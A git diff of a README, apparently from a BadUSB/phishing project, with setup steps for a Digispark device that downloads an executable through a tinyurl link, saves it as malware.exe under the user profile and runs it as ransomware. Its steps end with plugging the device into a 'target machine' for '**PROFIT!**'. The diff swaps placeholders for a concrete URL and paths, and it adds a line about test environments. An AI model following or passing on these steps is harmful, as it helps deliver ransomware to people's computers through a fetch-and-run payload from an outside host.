@@ -17,14 +17,15 @@ Check out more detailed usage of the [Ransomware in our project.](https://github
 - Open the file or paste the content to/in Arduino IDE.
 - Define:
 	-  `DownloadFile('URL_WHERE_TO_DOWNLOAD'`    
-	**NOTE: As is (`https://tinyurl.com/5e8yp8mf`), it downloads it from [here](https://github.com/therealhalonen/PhishSticks/tree/master/payloads/ransomware/Python%20app)**   
+	**NOTE: As is (`https://tinyurl.com/28sb6pvc`), it downloads it from [here](https://github.com/therealhalonen/PhishSticks/tree/master/payloads/ransomware/Python%20app)**   
 	
 	- Path, where to download and what to execute (both must be the same):
-		- `$env:UserProfile/PATH_TO_THE/SOMETHING.exe\\\`
+		- `$env:UserProfile/TestDirz338/malware.exe\\\`
 	- Working Dir:
-		- `$env:UserProfile//PATH_TO_THE\\\`
+		- `-WorkingDir \\\"$env:UserProfile/TestDirz338\\\`
+- Please note, that we don't recommend blindly using our tinyurl. Make your own URL and .exe to be safe!
 - Upload to Digispark
-- Make a directory named `TestDirz338` in the User-directory of the target machine. The directory name IS case sensitive and the directory needs to be in the correct directory for the ransomware to work.
+- Make a directory named `TestDirz338` in the User-directory of the target machine. The directory name IS case sensitive and the directory needs to be in the correct directory for the ransomware to work. Or adjust the code to suit your test environment.
 - Plug the Digispark in to the target machine
 - **PROFIT!**
 
